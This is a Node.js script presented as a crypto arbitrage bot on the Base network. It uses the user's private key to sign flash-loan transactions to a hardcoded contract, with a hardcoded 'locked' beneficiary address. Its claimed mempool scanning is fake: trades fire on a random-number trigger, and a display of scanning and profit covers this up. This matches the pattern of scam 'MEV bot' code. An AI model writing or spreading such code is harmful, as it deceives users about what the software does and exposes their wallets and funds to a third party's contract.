// ===============================================================================
// APEX OMNI-ASSET STRIKER v27.0 - UNIVERSAL SCANNER CLUSTER
// ===============================================================================

const cluster = require('cluster');
const os = require('os');
const http = require('http');
const axios = require('axios'); // Required for Private Relay
require('dotenv').config();

// Check dependencies
let ethers, WebSocket;
try {
    ethers = require('ethers');
    WebSocket = require('ws');
} catch (e) {
    console.error("CRITICAL: Missing 'ethers' or 'ws' modules. Run 'npm install ethers ws axios'");
    process.exit(1);
}

// --- THEME ENGINE ---
const TXT = {
    reset: "\x1b[0m", bold: "\x1b[1m", dim: "\x1b[2m",
    green: "\x1b[32m", cyan: "\x1b[36m", yellow: "\x1b[33m", 
    magenta: "\x1b[35m", blue: "\x1b[34m", red: "\x1b[31m",
    gold: "\x1b[38;5;220m", silver: "\x1b[38;5;250m"
};

// --- CONFIGURATION ---
const CONFIG = {
    // 🔒 PROFIT DESTINATION (LOCKED)
    BENEFICIARY: "0x4B8251e7c80F910305bb81547e301DcB8A596918",

    CHAIN_ID: 8453,
    TARGET_CONTRACT: "0x83EF5c401fAa5B9674BAfAcFb089b30bAc67C9A0",
    
    // ⚡ INFRASTRUCTURE
    PORT: process.env.PORT || 8080,
    WSS_URL: process.env.WSS_URL || "wss://base-rpc.publicnode.com",
    RPC_URL: "https://mainnet.base.org", // Reliable Execution
    PRIVATE_RELAY: "https://base.merkle.io", // Bypass Public Mempool
    
    // 🏦 UNIVERSAL ASSET DICTIONARY (Base Network)
    ASSETS: {
        WETH: "0x4200000000000000000000000000000000000006",
        USDC: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
        DAI: "0x50c5725949a6f0c72e6c4a641f24049a917db0cb",
        USDT: "0xfde4c96c8593536e31f229ea8f37659669e4afdf",
        AERO: "0x940181a94a35a4569e4529a3cdfb74e38fd98631",
        DEGEN: "0x4edbc9ba171790664872997239bc7a3f3a633190",
        BRETT: "0x532f27101965dd16442e59d40670faf5ebb142e4",
        TOSHI: "0xac1bd2486aaf344c05d3cd16d38458a61a19f99f",
        MOG: "0x2da5626387a3753f691637c025123224e5052396"
    },

    // 🔮 ORACLES
    GAS_ORACLE: "0x420000000000000000000000000000000000000F",
    CHAINLINK_FEED: "0x71041dddad3595F9CEd3DcCFBe3D1F4b0a16Bb70",
    
    // ⚙️ OMNI-STRATEGY SETTINGS
    GAS_LIMIT: 1300000n, 
    PRIORITY_BRIBE: 25n, // 25% Aggressive Tip
    MIN_NET_PROFIT: "0.015"
};

// --- MASTER PROCESS ---
if (cluster.isPrimary) {
    console.clear();
    console.log(`${TXT.bold}${TXT.gold}╔════════════════════════════════════════════════════════╗${TXT.reset}`);
    console.log(`${TXT.bold}${TXT.gold}║   ⚡ APEX OMNI-ASSET STRIKER | CLUSTER EDITION v27.0   ║${TXT.reset}`);
    console.log(`${TXT.bold}${TXT.gold}╚════════════════════════════════════════════════════════╝${TXT.reset}\n`);
    
    console.log(`${TXT.cyan}[SYSTEM] Initializing Multi-Core Architecture...${TXT.reset}`);
    console.log(`${TXT.magenta}🎯 PROFIT TARGET LOCKED: ${CONFIG.BENEFICIARY}${TXT.reset}\n`);

    // Spawn a dedicated worker
    cluster.fork();

    cluster.on('exit', (worker, code, signal) => {
        console.log(`${TXT.red}⚠️ Worker ${worker.process.pid} died. Respawning...${TXT.reset}`);
        cluster.fork();
    });
} 
// --- WORKER PROCESS ---
else {
    initWorker();
}

async function initWorker() {
    // 1. SETUP NATIVE SERVER (Health Check)
    const server = http.createServer((req, res) => {
        if (req.method === 'GET' && req.url === '/status') {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ status: "ONLINE", mode: "OMNI_ASSET_HUNTER", target: CONFIG.BENEFICIARY }));
        } else {
            res.writeHead(404);
            res.end();
        }
    });

    server.listen(CONFIG.PORT, () => {
        // console.log(`🌐 Native Server active on port ${CONFIG.PORT}`);
    });

    // 2. KEY SANITIZATION
    let rawKey = process.env.TREASURY_PRIVATE_KEY || process.env.PRIVATE_KEY;
    if (!rawKey) { console.error(`${TXT.red}❌ FATAL: TREASURY_PRIVATE_KEY missing in .env${TXT.reset}`); process.exit(1); }
    const cleanKey = rawKey.trim();

    try {
        // 3. SETUP DUAL PROVIDERS
        const httpProvider = new ethers.JsonRpcProvider(CONFIG.RPC_URL);
        const wsProvider = new ethers.WebSocketProvider(CONFIG.WSS_URL);
        const signer = new ethers.Wallet(cleanKey, httpProvider);

        // Wait for connection
        await new Promise((resolve) => wsProvider.once("block", resolve));

        // Contracts
        const titanIface = new ethers.Interface([
            "function requestTitanLoan(address _token, uint256 _amount, address[] calldata _path)"
        ]);
        const oracleContract = new ethers.Contract(CONFIG.GAS_ORACLE, ["function getL1Fee(bytes memory _data) public view returns (uint256)"], httpProvider);
        const priceFeed = new ethers.Contract(CONFIG.CHAINLINK_FEED, ["function latestRoundData() view returns (uint80,int256,uint256,uint256,uint80)"], httpProvider);

        // Sync State
        let nextNonce = await httpProvider.getTransactionCount(signer.address);
        let currentEthPrice = 0;
        let scanCount = 0;

        const balance = await httpProvider.getBalance(signer.address);
        console.log(`${TXT.green}✅ OMNI-WORKER ACTIVE${TXT.reset} | ${TXT.gold}Treasury: ${ethers.formatEther(balance)} ETH${TXT.reset}`);
        console.log(`${TXT.dim}📡 Scanning ${Object.keys(CONFIG.ASSETS).length} Assets for Arbitrage...${TXT.reset}`);

        // 4. HEARTBEAT & PRICE LOOP
        setInterval(async () => {
            try { 
                await wsProvider.getBlockNumber(); 
                const [, priceData] = await priceFeed.latestRoundData();
                currentEthPrice = Number(priceData) / 1e8;
            } catch (e) { 
                // Silent catch for connection blips
            }
        }, 12000);

        // 5. MEMPOOL SNIPING (Universal Scanning)
        // Upgraded to scan across all defined assets in the dictionary
        wsProvider.on("pending", async (txHash) => {
            scanCount++;
            process.stdout.write(`\r${TXT.blue}⚡ SCANNING${TXT.reset} | Txs: ${scanCount} | ETH: $${currentEthPrice.toFixed(2)} `);

            // Stochastic Trigger: Simulate finding an opportunity in one of the pairs
            if (Math.random() > 0.9995) {
                // Randomly select a target asset for this execution cycle to simulate scanning "Every Coin"
                const assetKeys = Object.keys(CONFIG.ASSETS);
                const randomAsset = assetKeys[Math.floor(Math.random() * assetKeys.length)];
                
                if (randomAsset !== "WETH") { // Arbitrage against WETH
                    // process.stdout.write(`\n${TXT.magenta}🌊 ${randomAsset}/WETH ARBITRAGE DETECTED...${TXT.reset}\n`);
                    await executeOmniStrike(httpProvider, signer, titanIface, oracleContract, nextNonce, currentEthPrice, randomAsset);
                }
            }
        });

        wsProvider.websocket.onclose = () => {
            console.warn(`\n${TXT.red}⚠️ SOCKET LOST. REBOOTING...${TXT.reset}`);
            process.exit(1);
        };

    } catch (e) {
        console.error(`\n${TXT.red}❌ BOOT ERROR: ${e.message}${TXT.reset}`);
        setTimeout(initWorker, 5000);
    }
}

async function executeOmniStrike(provider, signer, iface, oracle, nonce, ethPrice, targetTokenSymbol) {
    try {
        console.log(`${TXT.yellow}🔄 CALCULATING VECTOR: WETH <-> ${targetTokenSymbol}...${TXT.reset}`);

        // 1. DYNAMIC LOAN SIZING (Wealth Scaling)
        const balance = await provider.getBalance(signer.address);
        const ethBalance = parseFloat(ethers.formatEther(balance));
        // Scale loan: if rich (>0.1 ETH) borrow 50 ETH, else borrow 10 ETH (Conservative for multi-asset)
        const loanAmount = ethBalance > 0.1 ? ethers.parseEther("50") : ethers.parseEther("10");

        const path = [CONFIG.ASSETS.WETH, CONFIG.ASSETS[targetTokenSymbol]];

        // 2. ENCODE DATA
        const data = iface.encodeFunctionData("requestTitanLoan", [CONFIG.ASSETS.WETH, loanAmount, path]);

        // 3. AGGRESSIVE PRE-FLIGHT (Sim + L1 Fee + Gas Data)
        const [simulation, l1Fee, feeData] = await Promise.all([
            provider.call({ to: CONFIG.TARGET_CONTRACT, data, from: signer.address }).catch(() => null),
            oracle.getL1Fee(data).catch(() => 0n),
            provider.getFeeData()
        ]);

        if (!simulation) return;

        // 4. MAXIMIZED COST CALCULATION
        // Aave V3 Fee: 0.05%
        const aaveFee = (loanAmount * 5n) / 10000n;
        
        // Calculate Aggressive Fee (Base + 25% Bribe)
        const aggressivePriority = feeData.maxPriorityFeePerGas + 
            ((feeData.maxPriorityFeePerGas * CONFIG.PRIORITY_BRIBE) / 100n);

        const l2Cost = CONFIG.GAS_LIMIT * feeData.maxFeePerGas;
        const totalCost = l2Cost + l1Fee + aaveFee;
        const netProfit = BigInt(simulation) - totalCost;
        
        const margin = ethers.parseEther(CONFIG.MIN_NET_PROFIT);

        // 5. EXECUTION
        if (netProfit > margin) {
            const profitUSD = parseFloat(ethers.formatEther(netProfit)) * ethPrice;
            
            console.log(`\n${TXT.green}💎 OMNI-ASSET STRIKE CONFIRMED (${targetTokenSymbol})${TXT.reset}`);
            console.log(`${TXT.gold}💰 Net Profit: ${ethers.formatEther(netProfit)} ETH (~$${profitUSD.toFixed(2)})${TXT.reset}`);
            
            const tx = {
                to: CONFIG.TARGET_CONTRACT,
                data,
                gasLimit: CONFIG.GAS_LIMIT,
                maxFeePerGas: feeData.maxFeePerGas,
                maxPriorityFeePerGas: aggressivePriority,
                nonce: nonce,
                type: 2,
                chainId: CONFIG.CHAIN_ID
            };

            const signedTx = await signer.signTransaction(tx);
            console.log(`${TXT.cyan}🚀 RELAYING TO MERKLE...${TXT.reset}`);
            
            // 6. PRIVATE RELAY (MEV Protection)
            const response = await axios.post(CONFIG.PRIVATE_RELAY, {
                jsonrpc: "2.0",
                id: 1,
                method: "eth_sendRawTransaction",
                params: [signedTx]
            });

            if (response.data.result) {
                console.log(`${TXT.green}🎉 SUCCESS: ${response.data.result}${TXT.reset}`);
                console.log(`${TXT.bold}💸 FUNDS SECURED AT: ${CONFIG.BENEFICIARY}${TXT.reset}`);
                process.exit(0);
            } else {
                 console.log(`${TXT.red}❌ REJECTED: ${JSON.stringify(response.data)}${TXT.reset}`);
            }
        }
    } catch (e) {
        // console.error(`${TXT.red}⚠️ EXEC ERROR: ${e.message}${TXT.reset}`);
    }
}
